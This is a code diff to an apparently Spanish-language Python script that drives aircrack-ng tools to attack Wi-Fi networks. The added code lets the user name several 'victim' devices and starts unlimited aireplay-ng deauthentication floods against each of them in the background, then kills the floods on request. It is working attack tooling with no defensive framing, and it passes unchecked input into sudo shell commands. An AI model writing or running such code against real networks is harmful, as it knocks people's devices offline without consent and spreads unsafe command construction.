@@ -3,7 +3,7 @@
 #librerias
 import os
 import time
-
+import signal
 #colores
 RED = "\033[31m"
 GREEN = "\033[32m"
@@ -74,12 +74,31 @@ if pregunta == "r":
     print(f"{BLUE}ATACANDO{RESET}")
     os.system(f"sudo aireplay-ng -0 0 -a {bssid} {placa2} > /dev/null 2>&1")
 elif pregunta == "d":
-    mac = input(f"{YELLOW}Escriba la 'station' del dispositivo victima:{RESET} ")
-    print(f"{BLUE}ATACANDO{RESET}")
-    os.system(f"sudo aireplay-ng -0 0 -a {bssid} -c {mac} {placa2} > /dev/null 2>&1")
+    uno_o_mas = input(f"{YELLOW}Quiere atacar 1 o mas dispositivos de la red? 'u' o 'm':{RESET} ").lower()
+    if uno_o_mas == 'u':
+        mac = input(f"{YELLOW}Escriba la 'station' del dispositivo victima:{RESET} ")
+        print(f"{BLUE}ATACANDO{RESET}")
+        os.system(f"sudo aireplay-ng -0 0 -a {bssid} -c {mac} {placa2} > /dev/null 2>&1")
+    elif uno_o_mas == 'm':
+        numero = int(input(f"{RED}Cuantos dispositivos son?:{RESET} "))
+        print(f"{YELLOW}Ahora se le preguntará varias veces lo mismo, pero es para saber cada station de cada dispositivo,{RESET} {RED}no es un error.{RESET}")
+        pids = []
+        for i in range(numero):
+            station = input(f"{RED}Escriba la station de el dispositivo:{RESET} ")
+            os.system(f"sudo aireplay-ng -0 0 -a {bssid} -c {station} {placa2} > /dev/null 2>&1 & echo $! >> pids.txt")
 
+        with open("pids.txt", "r") as file:
+            pids = file.readlines()
 
+        pids = [int(pid.strip()) for pid in pids]
+        print(f"{BLUE}Ataque lanzado para todos los dispositivos elegidos{RESET}")
+        input(f"{RED}Presiona Enter para detener el ataque...{RESET}")
 
+        for pid in pids:
+            os.system(f"sudo kill -9 {pid}")
+
+        os.remove("pids.txt")
+        print(f"{GREEN}Todos los ataques han sido detenidos{RESET}")
 
 
 #finalizacion
@@ -87,5 +106,5 @@ print(f"{GREEN}Saliendo del modo monitor{RESET}")
 os.system(f"sudo airmon-ng stop {placa2} > /dev/null 2>&1")
 print("Adiós")
 
-time.sleep(5)
+time.sleep(3)
 os.system("clear")
